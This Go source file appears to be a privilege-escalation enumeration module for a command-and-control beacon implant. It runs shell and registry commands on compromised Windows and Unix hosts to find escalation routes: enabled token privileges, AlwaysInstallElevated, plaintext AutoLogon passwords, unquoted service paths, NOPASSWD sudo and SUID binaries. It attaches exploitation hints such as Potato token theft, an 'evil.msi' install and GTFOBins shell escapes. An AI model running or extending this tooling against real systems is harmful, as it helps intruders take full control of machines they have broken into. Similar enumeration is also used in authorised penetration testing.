package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"time"
)

// Severity tags used in the priv report.
const (
	sevInfo = "INFO"
	sevLow  = "LOW"
	sevMed  = "MED"
	sevHigh = "HIGH"
)

// privFinding is one enumeration result or heuristic hit.
type privFinding struct {
	Check    string
	Severity string
	Detail   string
}

// privChecker runs local privilege-escalation enumeration. It is deliberately
// built on the same command-execution primitive the beacon already uses
// (cmd.exe /c on Windows, sh -c elsewhere) so it adds no new dependency surface
// and works whether or not the umbra syscall engine came up.
type privChecker struct {
	findings []privFinding
}

func newPrivChecker() *privChecker {
	return &privChecker{findings: make([]privFinding, 0)}
}

func (p *privChecker) add(check, severity, detail string) {
	p.findings = append(p.findings, privFinding{Check: check, Severity: severity, Detail: strings.TrimSpace(detail)})
}

// run executes a command with a hard timeout and returns combined output.
func (p *privChecker) run(timeout time.Duration, name string, args ...string) string {
	cmd := exec.Command(name, args...)
	done := make(chan struct{})
	var out []byte
	var err error
	go func() {
		out, err = cmd.CombinedOutput()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(timeout):
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		return "[timeout]"
	}
	s := strings.TrimRight(string(out), "\r\n")
	if err != nil && s == "" {
		return "[error] " + err.Error()
	}
	return s
}

// sh runs a shell command line through the platform shell.
func (p *privChecker) sh(timeout time.Duration, line string) string {
	if runtime.GOOS == "windows" {
		return p.run(timeout, "cmd.exe", "/c", line)
	}
	return p.run(timeout, "sh", "-c", line)
}

// truncate bounds any single command's output so a chatty tool cannot blow up
// the result envelope.
func truncate(s string, maxLines int) string {
	if s == "" {
		return ""
	}
	lines := strings.Split(s, "\n")
	if len(lines) <= maxLines {
		return s
	}
	return strings.Join(lines[:maxLines], "\n") + fmt.Sprintf("\n... (%d more lines)", len(lines)-maxLines)
}

// RunAll runs the full enumeration set for the host OS.
func (p *privChecker) RunAll() {
	if runtime.GOOS == "windows" {
		p.winIdentity()
		p.winPrivileges()
		p.winGroups()
		p.winUAC()
		p.winAlwaysInstallElevated()
		p.winUnquotedServices()
		p.winAutoLogon()
		p.winAutoruns()
		p.winScheduledTasks()
		p.winPatches()
	} else {
		p.unixIdentity()
		p.unixSudo()
		p.unixSuid()
		p.unixCron()
		p.unixWritable()
	}
	p.network()
	p.checkEnv()
	p.checkDrives()
}

// RunSelective runs one named check (used by "priv <check>").
func (p *privChecker) RunSelective(name string) error {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "", "all":
		p.RunAll()
	case "identity", "whoami":
		if runtime.GOOS == "windows" {
			p.winIdentity()
		} else {
			p.unixIdentity()
		}
	case "privs", "privileges", "token":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv privileges: windows only")
		}
		p.winIdentity()
		p.winPrivileges()
	case "groups":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv groups: windows only")
		}
		p.winGroups()
	case "uac":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv uac: windows only")
		}
		p.winUAC()
	case "install", "alwaysinstall":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv install: windows only")
		}
		p.winAlwaysInstallElevated()
	case "services":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv services: windows only")
		}
		p.winUnquotedServices()
	case "autologon", "winlogon":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv autologon: windows only")
		}
		p.winAutoLogon()
	case "autoruns", "run":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv autoruns: windows only")
		}
		p.winAutoruns()
	case "tasks", "schtasks":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv tasks: windows only")
		}
		p.winScheduledTasks()
	case "patches", "hotfix":
		if runtime.GOOS != "windows" {
			return fmt.Errorf("priv patches: windows only")
		}
		p.winPatches()
	case "suid":
		if runtime.GOOS == "windows" {
			return fmt.Errorf("priv suid: unix only")
		}
		p.unixSuid()
	case "sudo":
		if runtime.GOOS == "windows" {
			return fmt.Errorf("priv sudo: unix only")
		}
		p.unixSudo()
	case "cron":
		if runtime.GOOS == "windows" {
			return fmt.Errorf("priv cron: unix only")
		}
		p.unixCron()
	case "network", "net":
		p.network()
	case "env":
		p.checkEnv()
	case "drives":
		p.checkDrives()
	default:
		return fmt.Errorf("unknown priv check %q (try identity|privs|groups|uac|install|services|autologon|autoruns|tasks|patches|network|env|drives|all)", name)
	}
	return nil
}

// ---- Windows checks -------------------------------------------------------

func (p *privChecker) winIdentity() {
	who := p.sh(8*time.Second, "whoami")
	ver := p.sh(8*time.Second, "ver")
	info := p.sh(12*time.Second, "systeminfo")
	// systeminfo is slow; only keep the identifying head.
	info = truncate(info, 12)
	p.add("Identity", sevInfo, fmt.Sprintf("whoami : %s\nversion: %s\n%s", who, ver, info))
}

func (p *privChecker) winPrivileges() {
	all := p.sh(10*time.Second, "whoami /priv")
	p.add("Token privileges", sevInfo, truncate(all, 40))

	// Heuristics: enabled privileges that map directly onto a known escalation
	// primitive. We only flag a privilege when it is present AND Enabled.
	risky := map[string]string{
		"SeImpersonatePrivilege":        "SeImpersonatePrivilege -> Potato family (JuicyPotato/GodPotato/RoguePotato) token theft",
		"SeAssignPrimaryTokenPrivilege": "SeAssignPrimaryTokenPrivilege -> token swapping for impersonation",
		"SeDebugPrivilege":              "SeDebugPrivilege -> open/duplicate tokens of other processes (incl. SYSTEM)",
		"SeBackupPrivilege":             "SeBackupPrivilege -> read SAM/SYSTEM hives, copy protected files",
		"SeRestorePrivilege":            "SeRestorePrivilege -> overwrite protected files / DLL hijack of privileged process",
		"SeTakeOwnershipPrivilege":      "SeTakeOwnershipPrivilege -> take ownership of any object and grant full control",
		"SeLoadDriverPrivilege":         "SeLoadDriverPrivilege -> load a malicious signed driver",
		"SeTcbPrivilege":                "SeTcbPrivilege -> act as part of the OS",
	}
	lower := strings.ToLower(all)
	for priv, why := range risky {
		lp := strings.ToLower(priv)
		if !strings.Contains(lower, lp) {
			continue
		}
		// Find the line for this privilege and check its state.
		for _, line := range strings.Split(all, "\n") {
			if !strings.Contains(strings.ToLower(line), lp) {
				continue
			}
			if strings.Contains(line, "Enabled") {
				p.add("Privilege heuristic", sevHigh, why)
			}
		}
	}
}

func (p *privChecker) winGroups() {
	local := p.sh(8*time.Second, "net localgroup administrators")
	groups := p.sh(8*time.Second, "whoami /groups")
	p.add("Groups", sevInfo, fmt.Sprintf("Local Administrators:\n%s\n\nToken groups:\n%s",
		truncate(local, 25), truncate(groups, 30)))
	if strings.Contains(local, "Administrators") && !strings.Contains(strings.ToLower(local), "denied") {
		// presence in listing confirmed below via whoami /groups membership.
		if strings.Contains(groups, "BUILTIN\\Administrators") {
			p.add("Admin membership", sevHigh, "current token is a member of BUILTIN\\Administrators")
		}
	}
}

func (p *privChecker) winUAC() {
	const key = `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
	enableLUA := p.sh(6*time.Second, `reg query "`+key+`" /v EnableLUA`)
	consent := p.sh(6*time.Second, `reg query "`+key+`" /v ConsentPromptBehaviorAdmin`)
	latfp := p.sh(6*time.Second, `reg query "`+key+`" /v LocalAccountTokenFilterPolicy`)
	p.add("UAC settings", sevInfo, strings.Join([]string{enableLUA, consent, latfp}, "\n"))

	if strings.Contains(enableLUA, "0x0") {
		p.add("UAC heuristic", sevMed, "EnableLUA=0 -> UAC disabled; every process runs at the user's full token")
	}
	if strings.Contains(latfp, "0x1") {
		p.add("UAC heuristic", sevMed, "LocalAccountTokenFilterPolicy=1 -> remote admin tokens are NOT filtered (enables remote pass-the-hash / psexec)")
	}
}

func (p *privChecker) winAlwaysInstallElevated() {
	hklm := p.sh(6*time.Second, `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated`)
	hkcu := p.sh(6*time.Second, `reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated`)
	p.add("AlwaysInstallElevated", sevInfo, fmt.Sprintf("HKLM:\n%s\nHKCU:\n%s", hklm, hkcu))
	if strings.Contains(hklm, "0x1") && strings.Contains(hkcu, "0x1") {
		p.add("AIE heuristic", sevHigh, "AlwaysInstallElevated=1 in both hives -> any MSI runs as SYSTEM (msiexec /quiet /i evil.msi)")
	}
}

func (p *privChecker) winUnquotedServices() {
	svc := p.sh(20*time.Second, `wmic service get name,displayname,pathname,startmode`)
	if strings.Contains(svc, "[error]") || strings.Contains(svc, "not recognized") {
		// wmic is deprecated/removed on recent builds; fall back to sc.
		svc = p.sh(20*time.Second, `sc query type= service state= all`)
		p.add("Services", sevInfo, truncate(svc, 60))
		p.add("Unquoted service path", sevLow, "wmic unavailable; run 'priv services' output manually or use PowerShell Get-CimInstance Win32_Service")
		return
	}
	p.add("Services (name,path,start)", sevInfo, truncate(svc, 60))

	// Heuristic: a service whose executable path has a space AND is not quoted
	// allows binary planting (e.g. C:\Program Files\Foo Bar\svc.exe resolves
	// C:\Program.exe first). The path is everything up to and including ".exe";
	// if the character immediately before the drive letter is a quote it is
	// already quoted and therefore not exploitable.
	var suspects []string
	for _, line := range strings.Split(svc, "\n") {
		low := strings.ToLower(line)
		exe := strings.Index(low, ".exe")
		if exe < 0 {
			continue
		}
		drive := -1
		for _, d := range []string{`c:\`, `d:\`, `e:\`, `f:\`, `g:\`, `h:\`} {
			if i := strings.Index(low, d); i >= 0 {
				drive = i
				break
			}
		}
		if drive < 0 {
			continue
		}
		if drive > 0 && line[drive-1] == '"' {
			continue // already quoted: safe
		}
		path := line[drive : exe+4]
		if strings.Contains(path, " ") {
			suspects = append(suspects, strings.TrimSpace(line))
		}
	}
	if len(suspects) > 0 {
		p.add("Unquoted service path", sevMed, "candidate services with an unquoted spaced path (binary planting):\n"+truncate(strings.Join(suspects, "\n"), 30))
	}
}

func (p *privChecker) winAutoLogon() {
	const key = `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
	out := p.sh(6*time.Second, `reg query "`+key+`"`)
	p.add("Winlogon / AutoLogon", sevInfo, truncate(out, 30))
	if strings.Contains(out, "DefaultPassword") {
		p.add("AutoLogon heuristic", sevHigh, "DefaultPassword present in Winlogon -> plaintext credential stored in registry")
	}
	if strings.Contains(out, "AutoAdminLogon") && strings.Contains(out, "0x1") {
		p.add("AutoLogon heuristic", sevMed, "AutoAdminLogon=1 -> console logon uses a stored account")
	}
}

func (p *privChecker) winAutoruns() {
	hklm := p.sh(6*time.Second, `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`)
	hkcu := p.sh(6*time.Second, `reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`)
	hklm32 := p.sh(6*time.Second, `reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"`)
	p.add("Autoruns", sevInfo, fmt.Sprintf("HKLM\\Run:\n%s\n\nHKCU\\Run:\n%s\n\nHKLM\\WOW6432Node\\Run:\n%s",
		truncate(hklm, 20), truncate(hkcu, 20), truncate(hklm32, 20)))
}

func (p *privChecker) winScheduledTasks() {
	out := p.sh(15*time.Second, `schtasks /query /fo LIST /v`)
	p.add("Scheduled tasks", sevInfo, truncate(out, 60))
	// Heuristic: tasks running as SYSTEM with a user-writable command hint.
	if strings.Contains(out, "SYSTEM") {
		p.add("Task heuristic", sevLow, "tasks run as SYSTEM flagged above -> review 'Run As User' vs 'Task To Run' for a writable binary")
	}
}

func (p *privChecker) winPatches() {
	out := p.sh(15*time.Second, `wmic qfe get HotFixID,Description,InstalledOn`)
	if strings.Contains(out, "[error]") || strings.Contains(out, "not recognized") {
		out = p.sh(15*time.Second, `powershell -NoProfile -Command "Get-HotFix | Select-Object HotFixID,Description,InstalledOn | Format-Table -AutoSize"`)
	}
	p.add("Installed patches", sevInfo, truncate(out, 40))
}

// ---- Unix checks ----------------------------------------------------------

func (p *privChecker) unixIdentity() {
	p.add("Identity", sevInfo, fmt.Sprintf("id    : %s\nuname : %s", p.sh(6*time.Second, "id"), p.sh(6*time.Second, "uname -a")))
}

func (p *privChecker) unixSudo() {
	out := p.sh(10*time.Second, "sudo -n -l 2>&1")
	p.add("Sudo rights", sevInfo, out)
	if strings.Contains(strings.ToLower(out), "nopasswd") {
		p.add("Sudo heuristic", sevHigh, "NOPASSWD entry present -> passwordless sudo command, check GTFOBins for the listed binary")
	}
}

func (p *privChecker) unixSuid() {
	out := p.sh(20*time.Second, "find / -perm -4000 -type f 2>/dev/null")
	p.add("SUID binaries", sevInfo, truncate(out, 60))
	if out != "" {
		p.add("SUID heuristic", sevMed, "SUID binaries listed above -> cross-reference with GTFOBins for a shell escape")
	}
}

func (p *privChecker) unixCron() {
	out := p.sh(10*time.Second, "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; crontab -l 2>/dev/null")
	p.add("Cron jobs", sevInfo, truncate(out, 40))
}

func (p *privChecker) unixWritable() {
	out := p.sh(20*time.Second, `find /etc /usr/local/bin /usr/local/sbin -writable -type f 2>/dev/null | head -50`)
	p.add("Writable system files", sevInfo, truncate(out, 50))
}

// ---- Cross-platform checks ------------------------------------------------

func (p *privChecker) network() {
	if runtime.GOOS == "windows" {
		cfg := p.sh(12*time.Second, "ipconfig /all")
		route := p.sh(8*time.Second, "route print -4")
		listen := p.sh(12*time.Second, "netstat -ano")
		p.add("Network config", sevInfo, truncate(cfg, 40))
		p.add("Routes", sevInfo, truncate(route, 30))
		p.add("Listening sockets", sevInfo, truncate(listen, 40))
		return
	}
	p.add("Network config", sevInfo, p.sh(8*time.Second, "ip addr 2>/dev/null || ifconfig -a"))
	p.add("Listening sockets", sevInfo, truncate(p.sh(8*time.Second, "ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null"), 40))
}

func (p *privChecker) checkEnv() {
	keys := []string{
		"USERNAME", "USER", "USERPROFILE", "HOMEPATH", "APPDATA", "LOCALAPPDATA",
		"PROGRAMDATA", "SYSTEMROOT", "SYSTEMDRIVE", "COMPUTERNAME", "LOGONSERVER",
		"PATH", "TEMP", "TMP",
	}
	var sb strings.Builder
	for _, k := range keys {
		if v := os.Getenv(k); v != "" {
			fmt.Fprintf(&sb, "%s=%s\n", k, v)
		}
	}
	p.add("Environment", sevInfo, strings.TrimSpace(sb.String()))
}

func (p *privChecker) checkDrives() {
	if runtime.GOOS != "windows" {
		return
	}
	var sb strings.Builder
	for _, d := range []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L"} {
		path := d + `:\`
		if _, err := os.Stat(path); err == nil {
			fmt.Fprintf(&sb, "%s\\ mounted\n", d)
		}
	}
	if sb.Len() > 0 {
		p.add("Mounted drives", sevInfo, strings.TrimSpace(sb.String()))
	}
}

// ---- Formatting -----------------------------------------------------------

// Results returns a copy of the findings sorted by severity (high first).
func (p *privChecker) Results() []privFinding {
	out := make([]privFinding, len(p.findings))
	copy(out, p.findings)
	rank := map[string]int{sevHigh: 0, sevMed: 1, sevLow: 2, sevInfo: 3}
	sort.SliceStable(out, func(i, j int) bool { return rank[out[i].Severity] < rank[out[j].Severity] })
	return out
}

// runPriv is the OpPriv entrypoint. An empty or "all" arg runs everything.
func runPriv(arg string) (string, error) {
	p := newPrivChecker()
	if err := p.RunSelective(arg); err != nil {
		return "", err
	}
	return formatPrivResults(p.Results()), nil
}

func formatPrivResults(fs []privFinding) string {
	var sb strings.Builder
	sb.WriteString("=== privilege escalation report ===\n")
	sb.WriteString(fmt.Sprintf("host: %s/%s  os: %s\n", mustHostname(), runtime.GOARCH, runtime.GOOS))

	high := 0
	for _, f := range fs {
		if f.Severity == sevHigh {
			high++
		}
	}
	fmt.Fprintf(&sb, "findings: %d  high: %d\n", len(fs), high)

	for _, f := range fs {
		fmt.Fprintf(&sb, "\n[%s] %s\n%s", f.Severity, f.Check, indentBlock(f.Detail))
	}
	return sb.String()
}

func indentBlock(s string) string {
	if s == "" {
		return "  (no data)\n"
	}
	var sb strings.Builder
	for _, line := range strings.Split(strings.TrimRight(s, "\n"), "\n") {
		sb.WriteString("  " + line + "\n")
	}
	return sb.String()
}

func mustHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}
